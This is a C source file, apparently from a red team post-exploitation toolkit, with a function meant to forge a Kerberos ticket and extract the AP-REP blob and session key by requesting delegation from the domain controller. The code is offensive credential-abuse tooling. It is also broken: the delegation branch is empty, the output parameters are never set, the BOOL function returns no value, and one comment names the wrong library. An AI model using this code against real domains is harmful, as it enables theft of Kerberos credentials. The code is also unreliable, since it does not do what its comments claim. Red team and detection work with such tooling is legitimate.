/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( LsaLookupAuthenticationPackage );
	D_API( LsaCallAuthenticationPackage );
	D_API( InitializeSecurityContextA );
	D_API( AcquireCredentialsHandleA );
	D_API( DeleteSecurityContext );
	D_API( FreeCredentialsHandle );
	D_API( LsaFreeReturnBuffer );
	D_API( FreeContextBuffer );
} API ;

/* Macros */
#ifndef SEC_SUCCESS
#define SEC_SUCCESS( Status )	( ( Status ) >= 0 )
#endif

/*!
 *
 * Purpose:
 *
 * Forges a ticket to the DC using the specified 
 * encryption algorithm. Returns a pointer to the
 * AP-REP blob and the session key.
 *
!*/
BOOL KrbForgeTicket( _In_ PCHAR ServicePrincipalName, _In_ ULONG EncryptionType, _In_ PVOID* Req, _In_ PULONG ReqLen, _In_ PVOID* Key, _In_ PULONG KeyLen )
{
	API		Api;
	SecBuffer	Buf;
	CtxtHandle	Ctx;
	TimeStamp	Tim;
	CredHandle	Crh;
	SecBufferDesc	Sbd;
	UNICODE_STRING	Uni;

	ULONG		Att = 0;
	SECURITY_STATUS	Scs = SEC_E_OK;

	HANDLE		S32 = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Tim, sizeof( Tim ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
	RtlSecureZeroMemory( &Sbd, sizeof( Sbd ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Reference NTDLL.DLL */
	S32 = LoadLibraryA( "secur32.dll" );

	if ( S32 != NULL ) {
		/* Build Stack API Table */
		Api.LsaLookupAuthenticationPackage = C_PTR( GetProcAddress( S32, "LsaLookupAuthenticationPackage" ) );
		Api.LsaCallAuthenticationPackage   = C_PTR( GetProcAddress( S32, "LsaCallAuthenticationPackage" ) );
		Api.InitializeSecurityContextA     = C_PTR( GetProcAddress( S32, "InitializeSecurityContextA" ) );
		Api.AcquireCredentialsHandleA      = C_PTR( GetProcAddress( S32, "AcquireCredentialsHandleA" ) );
		Api.DeleteSecurityContext          = C_PTR( GetProcAddress( S32, "DeleteSecurityContext" ) );
		Api.FreeCredentialsHandle          = C_PTR( GetProcAddress( S32, "FreeCredentialsHandle" ) );
		Api.LsaFreeReturnBuffer            = C_PTR( GetProcAddress( S32, "LsaFreeReturnBuffer" ) );
		Api.FreeContextBuffer              = C_PTR( GetProcAddress( S32, "FreeContextBuffer" ) );

		/* Acquire a handle to the kerberos name */
		if ( SEC_SUCCESS( ( Scs = Api.AcquireCredentialsHandleA( NULL, MICROSOFT_KERBEROS_NAME_A, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &Crh, &Tim ) ) ) ) {
			/* Set SecBuffer output information */
			Buf.cbBuffer   = 0;
			Buf.pvBuffer   = NULL;
			Buf.BufferType = SECBUFFER_TOKEN;
			Sbd.ulVersion  = SECBUFFER_VERSION;
			Sbd.cBuffers   = 1;
			Sbd.pBuffers   = C_PTR( & Buf );

			/* Attempt to initialize the security context handle */
			if ( SEC_SUCCESS( ( Scs = Api.InitializeSecurityContextA( &Crh, NULL, ServicePrincipalName, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &Ctx, &Sbd, &Att, NULL ) ) ) ) {
				/* Did we succeed in delegation? */
				if ( Att & ISC_REQ_DELEGATE ) {

				};
				/* Free the context buffer and security context */
				Api.FreeContextBuffer( Buf.pvBuffer );
				Api.DeleteSecurityContext( &Ctx );
			};

			/* Free the kerberos name */
			Api.FreeCredentialsHandle( &Crh );
		};
		/* Dereference */
		FreeLibrary( S32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Tim, sizeof( Tim ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
	RtlSecureZeroMemory( &Sbd, sizeof( Sbd ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
